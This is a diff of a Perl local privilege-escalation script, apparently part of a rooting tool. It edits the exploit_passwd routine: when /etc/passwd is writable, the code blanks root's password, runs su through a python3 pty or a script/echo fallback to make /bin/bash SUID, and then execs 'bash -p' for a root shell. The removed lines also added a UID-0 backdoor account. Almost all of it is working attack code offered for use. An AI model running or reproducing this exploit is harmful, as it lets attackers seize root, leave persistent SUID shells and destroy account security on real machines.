@@ -151,28 +151,33 @@ sub exploit_passwd {
     return 0 unless file_writable("/etc/passwd");
     print "${G}[+] /etc/passwd is writable!${Z}\n";
 
-    # Method 1: remove root password entirely
+    # Method 1: remove root password
     my $content = "";
     if (open(my $rf, '<', '/etc/passwd')) {
         local $/; $content = <$rf>; close $rf;
     }
     $content =~ s/^root:x:/root::/m;
-    $content .= "akuganteng::0:0:root:/root:/bin/bash\n";
     if (open(my $wf, '>', '/etc/passwd')) {
         print $wf $content; close $wf;
-        print "${G}[+] Root password removed + akuganteng added${Z}\n";
+        print "${G}[+] Root password removed${Z}\n";
     }
 
-    # Method 2: try su root (no pass now)
-    system("su -c 'chmod +s /bin/bash; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb' 2>/dev/null");
-    try_suid_bash();
-
-    # Method 3: use python if available
+    # Method 2: su via python3 pty (bypasses TTY requirement)
     if (find_binary("python3")) {
-        system(q{python3 -c 'import os;os.setuid(0);os.setgid(0);os.system("chmod +s /bin/bash")' 2>/dev/null});
-        try_suid_bash();
+        system(q{python3 -c '
+import pty, os
+pid = os.fork()
+if pid == 0:
+    pty.spawn(["/bin/su", "-c", "chmod +s /bin/bash; chmod +s /bin/bash"])
+else:
+    os.waitpid(pid, 0)
+' 2>/dev/null});
+    } else {
+        system("echo '' | su -c 'chmod +s /bin/bash' 2>/dev/null");
+        system("script -qc 'su -c \"chmod +s /bin/bash\"' /dev/null 2>/dev/null");
     }
 
+    try_suid_bash();
     return 1;
 }
 
@@ -549,7 +554,11 @@ sub main {
   GOTROOT:
     try_suid_bash();
     if (isroot()) { droproot(); }
-    print "${R}[-] Something went wrong. Try: /bin/bash -p${Z}\n";
+    if (is_suid("/bin/bash")) {
+        exec "/bin/bash", "-p";
+    }
+    # Not root yet but exploit claims success - continue to next phase
+    print "${Y}[*] Continuing to next phase...${Z}\n";
 }
 
 main();
